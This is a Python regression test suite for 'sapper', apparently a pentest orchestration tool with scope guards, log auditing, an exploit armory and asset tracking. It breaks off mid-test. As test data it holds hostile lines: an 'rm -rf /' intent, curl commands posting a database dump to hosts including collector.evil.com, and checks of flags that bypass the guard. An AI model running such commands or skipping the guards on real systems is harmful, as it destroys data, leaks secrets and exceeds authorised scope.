#!/usr/bin/env python3
"""Cross-platform regression for sapper.

Covers the CLI surface, the pre-flight guard, and index resilience. Runs
without pytest and without fcntl (goes through bin/sapper_win.py), so it
works on Windows as well as Linux.

    python tests/regress.py            # all tests
    python tests/regress.py guard      # only the guard suite
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import tempfile
import urllib.error
import urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
# Windows uses the launcher (injects an fcntl shim); Linux can run sapper.py
# directly and hit the real fcntl path. Override with SAPPER_ENTRY.
ENTRY = Path(os.environ.get("SAPPER_ENTRY", str(ROOT / "bin" / "sapper_win.py")))

# Regression must never write into the operator's real asset store.
os.environ.setdefault(
    "SAPPER_ASSETS_DB",
    str(Path(tempfile.gettempdir()) / f"sapper-regress-assets-{os.getpid()}.db"),
)
os.environ.setdefault(
    "SAPPER_ARMORY_ROOT",
    str(Path(tempfile.gettempdir()) / f"sapper-regress-armory-{os.getpid()}"),
)

PASS: list[str] = []
FAIL: list[tuple[str, str]] = []


# --------------------------------------------------------------------------- #
# harness
# --------------------------------------------------------------------------- #
def run(*args: str, cwd: Path, check: bool = True, env: dict | None = None):
    cmd = [sys.executable, str(ENTRY), *args]
    full_env = dict(os.environ)
    full_env.pop("SAPPER_EVENTS", None)
    full_env.update(env or {})
    proc = subprocess.run(
        cmd, cwd=str(cwd), capture_output=True, text=True,
        encoding="utf-8", errors="replace", env=full_env,
    )
    if check and proc.returncode != 0:
        raise AssertionError(
            f"sapper {' '.join(args)} -> rc={proc.returncode}\n"
            f"stdout: {proc.stdout}\nstderr: {proc.stderr}"
        )
    return proc


def case(name: str):
    def wrap(fn):
        def inner():
            try:
                fn()
                PASS.append(name)
                print(f"  PASS  {name}")
            except Exception as exc:
                FAIL.append((name, str(exc)))
                print(f"  FAIL  {name}\n        {exc}")
        inner.__name__ = name
        return inner
    return wrap


def fresh() -> Path:
    path = Path(tempfile.mkdtemp(prefix="sapper-regress-"))
    run("setup", "--goal", "回归测试", cwd=path)
    return path


def read_json(path: Path) -> dict:
    return json.loads(path.read_text(encoding="utf-8"))


# --------------------------------------------------------------------------- #
# full command surface
# --------------------------------------------------------------------------- #
@case("surface: 所有无外部依赖的命令都能跑通")
def surface_all_commands():
    work = Path(tempfile.mkdtemp(prefix="sapper-surface-"))
    try:
        run("init", "--goal", "全命令烟测", cwd=work)

        steps = [
            ("status",),
            ("graph",),
            ("validate",),
            ("frontier",),
            ("fact", "-t", "主机", "-k", "host", "-d", "host=10.0.0.5", "说明"),
            ("intent", "--from", "f001", "-t", "扫描", "描述"),
            ("hint", "人工提示"),
            ("hint", "--list"),
            ("show", "fact", "f001"),
            ("show", "intent", "i001"),
            ("pick",),
            ("claim", "i001", "--worker", "w"),
            ("doc", "i001", "--set", "详细方案"),
            ("doc", "i001"),
            ("recall", "扫描"),
            ("release", "i001", "--worker", "w"),
            ("claim", "i001", "--worker", "w"),
            ("done", "i001", "--worker", "w", "--fact", "扫到了", "-k", "service"),
            ("view", "--out", str(work / "graph.html")),
            ("scope", "add", "10.0.0.0/24"),
            ("scope",),
            ("kb", "search", "tomcat"),
            ("flag", "flag{test}", "-c", "ch1"),
            ("complete", "--from", "f002", "--note", "达成", "--worker", "w"),
            ("status",),
        ]
        bad = []
        for args in steps:
            proc = run(*args, cwd=work, check=False)
            if "Traceback" in proc.stderr:
                bad.append((args[0], proc.stderr.strip().splitlines()[-1][:120]))
        assert not bad, "以下命令抛异常: " + "; ".join(f"{a}: {e}" for a, e in bad)

        assert (work / "graph.html").exists(), "view 未生成 HTML"
        assert (work / ".sapper" / "hints").exists(), "hint 目录缺失"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("sync: 所有写操作后索引与 JSON 一致")
def sync_all_writes():
    work = Path(tempfile.mkdtemp(prefix="sapper-sync-"))
    try:
        run("init", "--goal", "同步测试", cwd=work)

        sys.path.insert(0, str(ROOT / "lib"))
        from index_db import IndexDB

        db = IndexDB(work / ".sapper" / "index.db")
        db.init()
        db.rebuild(
            [read_json(p) for p in sorted((work / ".sapper" / "facts").glob("*.json"))],
            [],
        )

        run("fact", "-t", "h", "-k", "host", "-d", "host=10.0.0.5", "x", cwd=work)
        run("intent", "--from", "f001", "-t", "i", "d", cwd=work)
        run("claim", "i001", "--worker", "w", cwd=work)
        run("doc", "i001", "--set", "方案正文", cwd=work)
        run("release", "i001", "--worker", "w", cwd=work)
        run("claim", "i001", "--worker", "w", cwd=work)
        run("done", "i001", "--worker", "w", "--fact", "结果", "-k", "vuln", cwd=work)
        run("fact", "-t", "h2", "-k", "cred", "-d", "user=a", "y", cwd=work)
        run("complete", "--from", "f002", "--note", "done", "--worker", "w", cwd=work)

        graph = db.graph()
        problems = []
        for path in sorted((work / ".sapper" / "facts").glob("*.json")):
            disk = read_json(path)
            hit = next((f for f in graph["facts"] if f["id"] == disk["id"]), None)
            if hit is None:
                problems.append(f"{disk['id']} 不在索引")
            elif (hit.get("doc") or "") != (disk.get("doc") or ""):
                problems.append(f"{disk['id']} doc 不同步")
            elif (hit.get("description") or "") != (disk.get("description") or ""):
                problems.append(f"{disk['id']} description 不同步")

        for path in sorted((work / ".sapper" / "intents").glob("*.json")):
            disk = read_json(path)
            hit = next((i for i in graph["intents"] if i["id"] == disk["id"]), None)
            if hit is None:
                problems.append(f"{disk['id']} 不在索引")
            elif hit.get("status") != disk.get("status"):
                problems.append(f"{disk['id']} status {hit.get('status')} != {disk.get('status')}")

        assert not problems, "索引漂移: " + "; ".join(problems[:6])

        events = [e["event"] for e in db.events_since(0)]
        for expected in ("fact.created", "intent.created", "intent.claimed",
                         "intent.released", "doc.updated", "intent.done", "project.done"):
            assert expected in events, f"缺少事件 {expected}，实际: {events}"
    finally:
        shutil.rmtree(work, ignore_errors=True)


# --------------------------------------------------------------------------- #
# CLI surface
# --------------------------------------------------------------------------- #
@case("cli: setup 创建图结构")
def cli_setup():
    work = fresh()
    try:
        for name in ("project.json", "facts", "intents", "hints"):
            assert (work / ".sapper" / name).exists(), f"缺少 {name}"
        assert len(list((work / ".sapper" / "facts").glob("*.json"))) == 1, "应有 goal fact"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("cli: fact/intent/claim/done 全链路")
def cli_lifecycle():
    work = fresh()
    try:
        run("fact", "-t", "主机", "-k", "host", "-d", "host=10.0.0.5", "说明", cwd=work)
        run("intent", "--from", "f001", "-t", "扫描", "描述", cwd=work)
        run("claim", "i001", "--worker", "w1", cwd=work)
        run("done", "i001", "--worker", "w1", "--fact", "结果", "-k", "service", cwd=work)

        fact = read_json(work / ".sapper" / "facts" / "f002.json")
        assert fact["source_intent"] == "i001", "done 产出的 fact 应记录来源 intent"
        intent = read_json(work / ".sapper" / "intents" / "i001.json")
        assert intent["status"] == "done" and intent["to"] == "f002", "intent 应已收尾"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("cli: status/graph/frontier/show/hint/validate 可用")
def cli_reads():
    work = fresh()
    try:
        run("fact", "-t", "a", "-k", "note", "b", cwd=work)
        run("intent", "--from", "f001", "-t", "c", "d", cwd=work)
        run("hint", "人工提示", cwd=work)
        for args in (("status",), ("graph",), ("frontier",), ("show", "fact", "f001"),
                     ("hint", "--list"), ("validate",)):
            run(*args, cwd=work)
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("cli: 非法 fact kind 被拒绝")
def cli_rejects_bad_kind():
    work = fresh()
    try:
        proc = run("fact", "-t", "x", "-k", "bogus", "y", cwd=work, check=False)
        assert proc.returncode != 0, "非法 kind 应返回非零"
    finally:
        shutil.rmtree(work, ignore_errors=True)


# --------------------------------------------------------------------------- #
# guard
# --------------------------------------------------------------------------- #
def guard_env(work: Path, *scopes: str) -> None:
    if scopes:
        run("scope", "add", *scopes, cwd=work)


def dispatch_rc(work: Path, iid: str, *extra: str) -> tuple[int, str]:
    proc = run("dispatch", iid, "--dry-run", *extra, cwd=work, check=False)
    return proc.returncode, (proc.stdout + proc.stderr)


@case("guard: 无范围 + 私有 IP 放行")
def guard_private_no_scope():
    work = fresh()
    try:
        run("fact", "-t", "h", "-k", "host", "-d", "host=10.0.0.5", "x", cwd=work)
        run("intent", "--from", "f001", "-t", "扫描", "对 10.0.0.5 执行 nmap", cwd=work)
        rc, out = dispatch_rc(work, "i001")
        assert rc == 0, f"私有 IP 应放行，实际 rc={rc}\n{out[:400]}"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("guard: 无范围 + 公网 IP 要求确认")
def guard_public_no_scope():
    work = fresh()
    try:
        run("fact", "-t", "h", "-k", "host", "-d", "host=1.2.3.4", "x", cwd=work)
        run("intent", "--from", "f001", "-t", "扫描", "对 8.8.8.8 执行 nmap", cwd=work)
        rc, out = dispatch_rc(work, "i001")
        assert rc != 0 and "requires confirmation" in out, f"公网应要求确认\n{out[:400]}"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("guard: 越界 IP 被 deny")
def guard_out_of_scope():
    work = fresh()
    try:
        guard_env(work, "10.0.0.0/24")
        run("fact", "-t", "h", "-k", "host", "-d", "host=10.0.0.5", "x", cwd=work)
        run("intent", "--from", "f001", "-t", "扫描", "对 8.8.8.8 执行 nmap", cwd=work)
        rc, out = dispatch_rc(work, "i001")
        assert rc != 0 and "DENIED" in out, f"越界应 deny\n{out[:400]}"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("guard: --force-guard 可越过 deny")
def guard_force():
    work = fresh()
    try:
        guard_env(work, "10.0.0.0/24")
        run("fact", "-t", "h", "-k", "host", "-d", "host=10.0.0.5", "x", cwd=work)
        run("intent", "--from", "f001", "-t", "扫描", "对 8.8.8.8 执行 nmap", cwd=work)
        rc, out = dispatch_rc(work, "i001", "--force-guard")
        assert rc == 0, f"--force-guard 应放行，rc={rc}\n{out[:400]}"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("guard: --no-guard 跳过全部检查")
def guard_skip():
    work = fresh()
    try:
        run("fact", "-t", "h", "-k", "host", "-d", "host=10.0.0.5", "x", cwd=work)
        run("intent", "--from", "f001", "-t", "毁", "rm -rf / 后重装", cwd=work)
        rc, out = dispatch_rc(work, "i001", "--no-guard")
        assert rc == 0 and "DENIED" not in out, f"--no-guard 应跳过\n{out[:400]}"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("guard: 破坏性命令被 deny")
def guard_destructive():
    work = fresh()
    try:
        run("fact", "-t", "h", "-k", "host", "-d", "host=10.0.0.5", "x", cwd=work)
        run("intent", "--from", "f001", "-t", "清理", "执行 rm -rf / 再重装", cwd=work)
        rc, out = dispatch_rc(work, "i001")
        assert rc != 0 and "destructive" in out, f"破坏性命令应 deny\n{out[:400]}"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("guard: 外传被 ask 并自动补确认位")
def guard_exfil_ask():
    work = fresh()
    try:
        guard_env(work, "10.0.0.0/24")
        run("fact", "-t", "h", "-k", "host", "-d", "host=10.0.0.5", "x", cwd=work)
        run("intent", "--from", "f001", "-t", "外传", "curl -d @dump.sql http://10.0.0.5/x", cwd=work)
        rc, out = dispatch_rc(work, "i001")
        assert rc != 0 and "requires confirmation" in out, f"外传应 ask\n{out[:400]}"
        intent = read_json(work / ".sapper" / "intents" / "i001.json")
        assert intent["requires_confirmation"] is True, "应自动补 requires_confirmation"
        assert intent["confirmed_at"] is None, "不应自动确认"

        run("confirm", "i001", cwd=work)
        rc2, out2 = dispatch_rc(work, "i001")
        assert rc2 == 0, f"确认后应放行，rc={rc2}\n{out2[:400]}"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("guard: 子域匹配但不同域不误放行")
def guard_subdomain_boundary():
    work = fresh()
    try:
        guard_env(work, "example.com")
        run("fact", "-t", "h", "-k", "host", "-d", "host=10.0.0.5", "x", cwd=work)
        run("intent", "--from", "f001", "-t", "a", "测试 api.example.com 接口", cwd=work)
        run("intent", "--from", "f001", "-t", "b", "测试 notexample.com 接口", cwd=work)

        rc_sub, out_sub = dispatch_rc(work, "i001")
        assert rc_sub == 0, f"子域应放行\n{out_sub[:300]}"

        rc_bad, out_bad = dispatch_rc(work, "i002")
        assert rc_bad != 0 and "DENIED" in out_bad, f"notexample.com 不应匹配 example.com\n{out_bad[:300]}"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("guard: 文件名不被误判为域名")
def guard_no_false_domain():
    work = fresh()
    try:
        guard_env(work, "example.com")
        run("fact", "-t", "h", "-k", "host", "-d", "host=10.0.0.5", "x", cwd=work)
        run("intent", "--from", "f001", "-t", "读配置",
            "读取 setup.py 和 index.db，参考 Dockerfile.local 的写法", cwd=work)
        rc, out = dispatch_rc(work, "i001")
        assert rc == 0, f"文件名不应触发越界\n{out[:400]}"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("guard: scope.json 损坏时不崩溃")
def guard_broken_scope():
    work = fresh()
    try:
        (work / ".sapper" / "scope.json").write_text("{ this is not json", encoding="utf-8")
        run("fact", "-t", "h", "-k", "host", "-d", "host=10.0.0.5", "x", cwd=work)
        run("intent", "--from", "f001", "-t", "扫描", "对 10.0.0.5 扫描", cwd=work)
        proc = run("dispatch", "i001", "--dry-run", cwd=work, check=False)
        assert "Traceback" not in proc.stderr, f"不应抛未捕获异常\n{proc.stderr[:400]}"
    finally:
        shutil.rmtree(work, ignore_errors=True)


# --------------------------------------------------------------------------- #
# index resilience
# --------------------------------------------------------------------------- #
@case("index: 缺失时 CLI 正常")
def index_missing_ok():
    work = fresh()
    try:
        assert not (work / ".sapper" / "index.db").exists(), "初始不该有索引"
        run("fact", "-t", "a", "-k", "host", "b", cwd=work)
        run("status", cwd=work)
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("index: 损坏时 CLI 仍正常")
def index_corrupt_ok():
    work = fresh()
    try:
        (work / ".sapper" / "index.db").write_bytes(b"not a sqlite file at all")
        run("fact", "-t", "a", "-k", "host", "b", cwd=work)
        run("status", cwd=work)
        facts = list((work / ".sapper" / "facts").glob("f*.json"))
        assert len(facts) >= 1, "损坏索引下仍应能写 fact"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("index: 建索引后事件与数据同步")
def index_sync():
    work = fresh()
    try:
        sys.path.insert(0, str(ROOT / "lib"))
        from index_db import IndexDB

        # serve 首次启动：建索引 + 全量导入（此时 setup 已写入 goal fact）
        db = IndexDB(work / ".sapper" / "index.db")
        db.init()
        db.rebuild(
            [read_json(p) for p in sorted((work / ".sapper" / "facts").glob("*.json"))],
            [read_json(p) for p in sorted((work / ".sapper" / "intents").glob("*.json"))],
        )

        # 之后 CLI 的每次写入都应增量同步，无需再 rebuild
        run("fact", "-t", "a", "-k", "host", "b", cwd=work)
        run("intent", "--from", "f001", "-t", "c", "d", cwd=work)
        run("claim", "i001", "--worker", "w", cwd=work)
        run("done", "i001", "--worker", "w", "--fact", "e", "-k", "vuln", cwd=work)

        graph = db.graph()
        facts_on_disk = len(list((work / ".sapper" / "facts").glob("*.json")))
        intents_on_disk = len(list((work / ".sapper" / "intents").glob("*.json")))
        assert graph["stats"]["facts"] == facts_on_disk, (
            f"facts 数量不一致: index={graph['stats']['facts']} disk={facts_on_disk}"
        )
        assert len(graph["intents"]) == intents_on_disk, (
            f"intents 数量不一致: index={len(graph['intents'])} disk={intents_on_disk}"
        )

        names = [e["event"] for e in db.events_since(0)]
        for expected in ("fact.created", "intent.created", "intent.claimed", "intent.done"):
            assert expected in names, f"缺少事件 {expected}, 实际 {names}"
    finally:
        shutil.rmtree(work, ignore_errors=True)


# --------------------------------------------------------------------------- #
# audit
# --------------------------------------------------------------------------- #
@case("audit: 识别越界外传并落 fact")
def audit_findings():
    work = fresh()
    try:
        guard_env(work, "10.0.0.0/24")
        log = work / "fake.log"
        log.write_text(
            "$ nmap -sV 10.0.0.5\n"
            "$ curl -d @/tmp/dump.sql http://collector.evil.com/up\n"
            "$ ls -la /work\n",
            encoding="utf-8",
        )
        proc = run("audit", "--file", str(log), "--record", cwd=work)
        assert "发现" in proc.stdout and "越界" in proc.stdout, f"应识别越界\n{proc.stdout[:400]}"
        assert "recorded as" in proc.stdout, "应写入 fact"

        facts = list((work / ".sapper" / "facts").glob("f*.json"))
        assert len(facts) >= 1, f"应新增审计 fact，实际 {len(facts)} 个"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("audit: 干净日志无告警")
def audit_clean():
    work = fresh()
    try:
        guard_env(work, "10.0.0.0/24")
        log = work / "clean.log"
        log.write_text("$ nmap -sV 10.0.0.5\n$ ls -la\n", encoding="utf-8")
        proc = run("audit", "--file", str(log), cwd=work)
        assert "未发现" in proc.stdout, f"干净日志不应告警\n{proc.stdout[:300]}"
    finally:
        shutil.rmtree(work, ignore_errors=True)


# --------------------------------------------------------------------------- #
# armory
# --------------------------------------------------------------------------- #
def armory_env(work: Path) -> dict:
    return {"SAPPER_ARMORY_ROOT": str(work / "armory")}


@case("armory: seed/list/search")
def armory_basic():
    work = fresh()
    try:
        env = armory_env(work)
        run("armory", "seed", cwd=work, env=env)
        listing = run("armory", "list", cwd=work, env=env).stdout
        assert "w001" in listing and "共 4 项" in listing, f"list 输出异常:\n{listing[:400]}"

        hits = run("armory", "search", "tomcat", cwd=work, env=env).stdout
        assert "w001" in hits and "Ghostcat" in hits, f"search 输出异常:\n{hits}"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("armory: 评分随结果变化")
def armory_scoring():
    work = fresh()
    try:
        env = armory_env(work)
        run("armory", "seed", cwd=work, env=env)

        out = run("armory", "report", "w002", "--vid", "v3", "--result", "ok",
                  cwd=work, env=env).stdout
        assert "conf=0.67" in out, f"一次成功后置信度应为 0.67:\n{out}"

        out = run("armory", "report", "w002", "--vid", "v3", "--result", "ok",
                  cwd=work, env=env).stdout
        assert "conf=0.75" in out, f"两次成功后应为 0.75:\n{out}"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("armory: 连续被拦自动弃用")
def armory_deprecate():
    work = fresh()
    try:
        env = armory_env(work)
        run("armory", "seed", cwd=work, env=env)
        for _ in range(3):
            run("armory", "report", "w002", "--vid", "v2", "--result", "blocked",
                cwd=work, env=env)
        show = run("armory", "show", "w002", cwd=work, env=env).stdout
        assert "已弃用" in show, f"三次被拦应标记弃用:\n{show[:500]}"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("armory: use 自动选最优且跳过弃用")
def armory_use_best():
    work = fresh()
    try:
        env = armory_env(work)
        run("armory", "seed", cwd=work, env=env)
        for _ in range(3):
            run("armory", "report", "w002", "--vid", "v2", "--result", "blocked",
                cwd=work, env=env)
        for _ in range(2):
            run("armory", "report", "w002", "--vid", "v3", "--result", "ok",
                cwd=work, env=env)

        out = run("armory", "use", "w002", cwd=work, env=env).stdout
        assert "w002/v3" in out, f"应选 conf 最高的 v3:\n{out}"
        assert "v2" not in out.split("\n")[0], "不应选中已弃用的 v2"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("armory: done --weapon 自动记分")
def armory_done_link():
    work = fresh()
    try:
        env = armory_env(work)
        run("armory", "seed", cwd=work, env=env)
        run("fact", "-t", "h", "-k", "host", "-d", "host=10.0.0.5", "x", cwd=work)
        run("intent", "--from", "f001", "-t", "t", "d", cwd=work)
        run("claim", "i001", "--worker", "w", cwd=work)

        out = run("done", "i001", "--worker", "w", "--fact", "r", "-k", "vuln",
                  "--weapon", "w002", "--vid", "v3", "--result", "ok",
                  cwd=work, env=env).stdout
        assert "conf=0.67" in out, f"done 应触发武器记分:\n{out}"

        show = run("armory", "show", "w002", cwd=work, env=env).stdout
        assert "tries=1 ok=1" in show, f"武器库应已更新:\n{show[:400]}"

        # 缺 --vid 时应在动手前就拒绝
        run("intent", "--from", "f001", "-t", "x", "y", cwd=work)
        proc = run("done", "i002", "--fact", "z", "--weapon", "w002",
                   cwd=work, env=env, check=False)
        assert proc.returncode != 0 and "--vid" in (proc.stderr + proc.stdout), (
            f"缺 --vid 应被拒绝:\n{proc.stdout}{proc.stderr}"
        )
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("armory: 未知武器/变体给出可读错误")
def armory_errors():
    work = fresh()
    try:
        env = armory_env(work)
        run("armory", "seed", cwd=work, env=env)

        proc = run("armory", "show", "w999", cwd=work, env=env, check=False)
        assert proc.returncode != 0 and "Traceback" not in proc.stderr, (
            f"未知武器应友好报错:\n{proc.stderr[:300]}"
        )

        proc = run("armory", "report", "w002", "--vid", "v9", "--result", "ok",
                   cwd=work, env=env, check=False)
        assert proc.returncode != 0 and "Traceback" not in proc.stderr, (
            f"未知变体应友好报错:\n{proc.stderr[:300]}"
        )
    finally:
        shutil.rmtree(work, ignore_errors=True)


# --------------------------------------------------------------------------- #
# assets (cross-engagement layer)
# --------------------------------------------------------------------------- #
def assets_env(work: Path) -> dict:
    return {"SAPPER_ASSETS_DB": str(work / "assets.db")}


@case("assets: fact 自动沉淀，note 不入库，host 不被 cred 污染")
def assets_ingest():
    work = fresh()
    try:
        env = assets_env(work)
        run("fact", "-t", "边界", "-k", "host", "-d", "host=10.0.0.5", "-d", "port=8080", "x",
            cwd=work, env=env)
        run("fact", "-t", "Tomcat", "-k", "service", "-d", "host=10.0.0.5", "-d", "port=8080",
            "-d", "product=tomcat", "x", cwd=work, env=env)
        run("fact", "-t", "Ghostcat", "-k", "vuln", "-d", "cve=CVE-2020-1938",
            "-d", "host=10.0.0.5", "x", cwd=work, env=env)
        run("fact", "-t", "弱口令", "-k", "cred", "-d", "user=admin", "-d", "host=10.0.0.5",
            "x", cwd=work, env=env)
        run("fact", "-t", "随笔", "-k", "note", "不该进资产库", cwd=work, env=env)

        out = run("assets", "stats", cwd=work, env=env).stdout
        assert "assets: 4" in out, f"应有 4 个资产:\n{out}"
        for t in ("ip", "service", "vuln", "cred"):
            assert t in out, f"缺少资产类型 {t}:\n{out}"

        import sqlite3
        conn = sqlite3.connect(str(work / "assets.db"))
        conn.row_factory = sqlite3.Row
        host = conn.execute("SELECT * FROM assets WHERE key='ip:10.0.0.5'").fetchone()
        assert host is not None, "主机资产未沉淀"
        assert "user" not in json.loads(host["data"]), (
            f"host 资产被 cred 的字段污染: {host['data']}"
        )
        assert conn.execute("SELECT COUNT(*) FROM assets WHERE type='note'").fetchone()[0] == 0
        conn.close()
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("assets: 跨任务继承，标题取资产值，重跑幂等")
def assets_cross_task():
    work = fresh()
    try:
        env = assets_env(work)
        run("fact", "-t", "边界", "-k", "host", "-d", "host=10.0.0.5", "x", cwd=work, env=env)
        run("fact", "-t", "后台弱口令", "-k", "cred", "-d", "user=admin",
            "-d", "host=10.0.0.5", "x", cwd=work, env=env)

        second = work / "task2"
        second.mkdir()
        run("setup", "--goal", "第二个任务", cwd=second, env=env)

        dry = run("assets", "seed", "--match", "10.0.0", "--dry-run", cwd=second, env=env).stdout
        assert "dry-run" in dry and "ip:10.0.0.5" in dry, f"dry-run 未列出待继承资产:\n{dry}"

        out = run("assets", "seed", "--match", "10.0.0", cwd=second, env=env).stdout
        assert "已继承" in out, f"继承失败:\n{out}"

        facts = [read_json(p) for p in sorted((second / ".sapper" / "facts").glob("f*.json"))]
        by_kind = {f["kind"]: f for f in facts}
        assert by_kind["host"]["title"] == "10.0.0.5", (
            f"继承标题应为资产值，实际 {by_kind['host']['title']!r}"
        )
        assert by_kind["host"]["data"]["inherited"] == "true"
        assert by_kind["cred"]["data"]["asset_key"] == "cred:admin@10.0.0.5"

        again = run("assets", "seed", "--match", "10.0.0", cwd=second, env=env).stdout
        assert "不重复继承" in again, f"重跑应跳过已继承项:\n{again}"
        assert len(list((second / ".sapper" / "facts").glob("f*.json"))) == 2
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("assets: rebuild 可从历史项目回灌")
def assets_rebuild():
    work = fresh()
    try:
        env = assets_env(work)
        run("fact", "-t", "a", "-k", "host", "-d", "host=192.0.2.10", "x", cwd=work, env=env)
        run("fact", "-t", "b", "-k", "service", "-d", "host=192.0.2.10",
            "-d", "port=443", "x", cwd=work, env=env)

        # wipe, then rebuild from the engagement on disk
        run("assets", "forget", "--all", cwd=work, env=env)
        assert "assets: 0" in run("assets", "stats", cwd=work, env=env).stdout

        out = run("assets", "rebuild", "--from", str(work), cwd=work, env=env).stdout
        assert "2 assets" in out, f"rebuild 未回灌:\n{out}"
        listing = run("assets", cwd=work, env=env).stdout
        assert "192.0.2.10" in listing and "192.0.2.10:443" in listing, listing
    finally:
        shutil.rmtree(work, ignore_errors=True)


# --------------------------------------------------------------------------- #
# traffic (MITM capture)
# --------------------------------------------------------------------------- #
TRAFFIC_MIX = [
    {"method": "GET", "url": "http://t.local/index.html", "path": "/index.html",
     "host": "t.local", "status": 200, "mime": "text/html", "resp_size": 1200},
    {"method": "GET", "url": "http://t.local/app.css", "path": "/app.css",
     "host": "t.local", "status": 200, "mime": "text/css", "resp_size": 900},
    {"method": "GET", "url": "http://t.local/api/user?id=1", "path": "/api/user",
     "host": "t.local", "status": 200, "mime": "application/json", "resp_size": 88},
    {"method": "GET", "url": "http://t.local/logo.png", "path": "/logo.png",
     "host": "t.local", "status": 200, "mime": "image/png"},
    {"method": "GET", "url": "http://t.local/x", "path": "/x",
     "host": "t.local", "status": 304, "mime": "text/html"},
    {"method": "POST", "url": "http://t.local/login", "path": "/login",
     "host": "t.local", "status": 302, "mime": "text/html", "req_body": "user=a&pass=b"},
    {"method": "GET", "url": "http://t.local/admin", "path": "/admin",
     "host": "t.local", "status": 403, "mime": "text/html"},
    {"method": "GET", "url": "http://t.local/boom", "path": "/boom",
     "host": "t.local", "status": 500, "mime": "text/html"},
    {"method": "GET", "url": "http://t.local/plain", "path": "/plain",
     "host": "t.local", "status": 200, "mime": "text/plain"},
]


def write_traffic(work: Path, records: list[dict]) -> Path:
    path = work / "flows.json"
    path.write_text(json.dumps(records, ensure_ascii=False), encoding="utf-8")
    return path


@case("traffic: 入库前过滤，静态与 304 丢弃")
def traffic_filter():
    work = fresh()
    try:
        out = run("traffic", "import", "--file", str(write_traffic(work, TRAFFIC_MIX)),
                  cwd=work).stdout
        assert "imported 6 kept, 3 dropped" in out, f"过滤结果不符:\n{out}"
        assert "static: 2" in out and "not-modified: 1" in out, f"丢弃原因不符:\n{out}"

        listing = run("traffic", cwd=work).stdout
        for kept in ("/admin", "/login", "/api/user", "/boom", "/plain", "/index.html"):
            assert kept in listing, f"应保留 {kept}:\n{listing}"
        for dropped in ("/app.css", "/logo.png", "t.local/x"):
            assert dropped not in listing, f"应丢弃 {dropped}:\n{listing}"
        assert "state-changing" in listing, "POST /login 应标注 state-changing"
        assert "error-surface" in listing, "403/500 应标注 error-surface"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("traffic: 按主机/状态码/关键词查询")
def traffic_query():
    work = fresh()
    try:
        run("traffic", "import", "--file", str(write_traffic(work, TRAFFIC_MIX)), cwd=work)

        only_403 = run("traffic", "list", "--status", "403", cwd=work).stdout
        assert "t.local/admin" in only_403 and "t.local/plain" not in only_403, only_403

        assert "6 条" in run("traffic", "list", "--host", "t.local", cwd=work).stdout
        assert "(无匹配流量)" in run("traffic", "list", "--host", "nope.local",
                                    cwd=work).stdout

        hit = run("traffic", "search", "boom", cwd=work).stdout
        assert "t.local/boom" in hit and "1 条" in hit, hit
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("traffic: clear 必须显式 --all，且不产生 Traceback")
def traffic_clear_guard():
    work = fresh()
    try:
        run("traffic", "import", "--file", str(write_traffic(work, TRAFFIC_MIX)), cwd=work)

        proc = run("traffic", "clear", cwd=work, check=False)
        assert proc.returncode != 0 and "Traceback" not in proc.stderr, (
            f"未确认的 clear 应被拒绝:\n{proc.stderr[:300]}"
        )

        out = run("traffic", "clear", "--all", cwd=work).stdout
        assert "已删除 6 条" in out, out
        assert "traffic: 0 条" in run("traffic", "stats", cwd=work).stdout
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("serve: --allow-write 时 ops 接口可写图、可搜索")
def serve_write_ops():
    import socket
    import time
    import urllib.request

    work = fresh()
    try:
        with socket.socket() as sock:
            sock.bind(("127.0.0.1", 0))
            port = sock.getsockname()[1]

        proc = subprocess.Popen(
            [sys.executable, str(ENTRY), "serve", "--port", str(port),
             "--rebuild", "--allow-write"],
            cwd=str(work), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
        )

        def api(path: str, body: dict | None = None) -> dict:
            if body is None:
                req = urllib.request.Request(f"http://127.0.0.1:{port}{path}")
            else:
                req = urllib.request.Request(
                    f"http://127.0.0.1:{port}{path}",
                    data=json.dumps(body).encode(),
                    headers={"Content-Type": "application/json"}, method="POST",
                )
            with urllib.request.urlopen(req, timeout=10) as resp:
                return json.loads(resp.read().decode())

        try:
            deadline = time.time() + 15
            health = None
            while time.time() < deadline:
                try:
                    health = api("/api/health")
                    break
                except Exception:
                    time.sleep(0.3)
            assert health and health.get("write") is True, "写模式未生效"

            got = api("/api/ops/fact", {
                "title": "web 建的主机", "description": "从 HTTP 接口写入",
                "kind": "host", "data": {"host": "10.1.2.3"},
            })
            assert api("/api/chat").get("enabled") is True, "写模式应启用对话"
            try:
                api("/api/chat", {"message": "  "})
                raise AssertionError("空消息应被拒绝")
            except urllib.error.HTTPError as exc:
                assert exc.code == 400
            assert api("/api/chat").get("messages") is not None

            fid = got["fact"]["id"]
            assert fid.startswith("f"), got
            assert got["fact"]["creator"] == "web"

            got = api("/api/ops/intent", {
                "title": "web 建的意图", "description": "验证写接口",
                "from": [fid], "requires_confirmation": True,
            })
            iid = got["intent"]["id"]
            assert got["intent"]["status"] == "open", got

            # confirmation gate must still apply through the web path
            try:
                api(f"/api/ops/claim/{iid}", {"worker": "web"})
